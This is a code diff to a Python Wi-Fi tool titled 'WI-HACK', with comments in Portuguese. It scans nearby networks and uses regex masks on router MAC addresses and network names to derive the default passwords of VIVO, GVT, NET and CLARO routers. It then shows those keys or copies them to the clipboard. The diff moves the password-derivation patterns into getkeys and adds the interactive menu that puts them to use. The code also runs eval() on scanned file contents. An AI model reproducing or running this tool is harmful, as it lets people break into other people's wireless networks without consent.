@@ -1,5 +1,6 @@
-from tools.utils import edfile, reif, reg, cl
-from tools.design import menu_simples, color
+from tools.utils import edfile, reg, cl
+from tools.design import menu_simples, color, color_print
+from time import sleep
 
 try:
     import androidhelper
@@ -13,12 +14,6 @@ except ImportError:
         is_droid = False
 else:
     is_droid = True
-
-# Padrao usando apenas o mac + nome
-
-def_eid = [['{mac.upper()} {name}', r'..:(..):(..):(..):..:.. (VIVO(FIBRA)?|GVT)-(\w+)', r'$1$2$3$6'],
-           ['{mac.upper()} {name}', r'..:..:(..):..:..:.. (NET|CLARO)_[25]G(\w+)', r'$1$3'],
-           ['{mac} {name}', r'..:(..):(..):..:..:(..) VIVO-(\w+)-[25]G', r'$1$2$4$3']]
 
 
 # Obtém informações das redes próximas 
@@ -34,7 +29,7 @@ def scan_results():
                 break
     else:
         nets = edfile('wifiScanResults.txt')
-        nets = eval(nets)[1]
+        nets = eval(nets)
 
     return nets
 
@@ -46,22 +41,88 @@ def clip(string):
 
 # Tenta obter a senha padrão com o mac + nome_da_rede
 def getkeys(mac, name):
+
     passwd = []
-    global def_eid
+
+    def_eid = [['{mac.upper()} {name}', r'..:(..):(..):(..):..:.. (VIVO(FIBRA)?|GVT)-(\w+)', r'$1$2$3$6'],
+               ['{mac.upper()} {name}', r'..:..:(..):..:..:.. (NET|CLARO)_[25]G(\w+)', r'$1$3'],
+               ['{mac} {name}', r'..:(..):(..):..:..:(..) VIVO-(\w+)-[25]G', r'$1$2$4$3']]
 
     for mask in def_eid:
         mask[0] = eval(f"f'{mask[0]}'")
         key = reg(*mask)
 
         if mask[0] != key:
-            passwd = key
+            passwd += [key]
 
     return passwd
 
-getkeys('11:aa:bb:cc:EE:dd', 'VIVO-1234')
+
 # Programa Principal
 
-# while True:
-#     for net in nets:
-#         eid = net['ssid']
-#         menu_simples( prompt='>>> ', mask=color(':n::vm:[{i}]--:az:[{r}]::'))
+while True:
+
+    list_nets = ['[Sair]', '[Rescan]']
+    nets = scan_results()
+
+    for net in nets:
+        eid = net['ssid']
+        bid = net['bssid']
+        sig = net['level']
+
+        list_nets.append(color(f':vm:----------:az:[{sig}]-[{eid}]::'))
+
+    cl()
+
+    color_print(f':n::az:{"-" * 40}[:vd:WI-HACK:az:]::\n')
+
+    op1 = menu_simples(*list_nets,
+                       prompt=color('\n:n::ci:>>> ::'),
+                       mask=color(':n::vm:[{i}]-:az:{r}::'))
+
+    if op1 == 1:
+        color_print(':n::vm:Saindo....::')
+        sleep(1)
+        break
+
+    elif op1 == 2:
+        continue
+
+    else:
+        op1 -= 3
+
+    name = nets[op1]['ssid']
+    mac = nets[op1]['bssid']
+
+    while True:
+        cl()
+        keys = getkeys(mac, name)
+
+        if len(keys) == 0:
+            color_print(':n::az:Não há nenhuma senha conhecida com essa rede::')
+            sleep(2.5)
+            break
+
+        else:
+            keys = ['<<< Voltar'] + keys
+            op2 = menu_simples(*keys,
+                               prompt=color('\n:n::ci:>>> ::'),
+                               mask=color(':n::vm:[{i}]-:az:[{r}]::'))
+
+            op2 -= 1
+            if op2 == 0:
+                break
+
+            if 'android' in locals() or 'androidhelper' in locals():
+                clip(keys[op2])
+            else:
+                color_print(':vd:Você não esta em um dispositivo android')
+                sleep(1)
+                color_print(f'Mas a senha que você selecionou foi: {keys[op2]}::')
+                sleep(3)
+
+
+
+
+
+
